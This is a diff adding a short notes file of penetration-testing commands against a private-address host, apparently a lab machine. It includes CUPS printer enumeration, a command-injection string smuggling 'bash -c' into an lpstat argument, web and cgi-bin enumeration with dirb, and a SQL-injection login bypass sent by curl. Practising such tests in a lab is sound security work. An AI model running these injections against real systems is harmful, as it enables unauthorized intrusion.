@@ -1,0 +1,31 @@
+# CUPS Enumeration
+
+lpstat -v
+lpstat -h 192.168.56.106 -v
+lpinfo -h 192.168.56.106 -v
+which lpinfo
+
+# Injection attempt via lpstat
+
+lpstat -h 192.168.56.106 -v '";bash -c "id > /tmp/pwned";"'
+
+# Web enumeration (HTTP)
+
+curl http://192.168.56.106/server-status
+curl http://192.168.56.106/server-info
+curl http://192.168.56.106/cgi-bin/
+
+# Directory brute-force
+
+dirb http://192.168.56.106/cgi-bin/
+dirb https://192.168.56.106/
+
+# HTTPS application inspection
+
+curl -k https://192.168.56.106/
+curl -k https://192.168.56.106/index.php
+
+# Login testing
+
+curl -k -X POST https://192.168.56.106/index.php \
+-d "uname=admin' --&psw=test&btnLogin=Login"
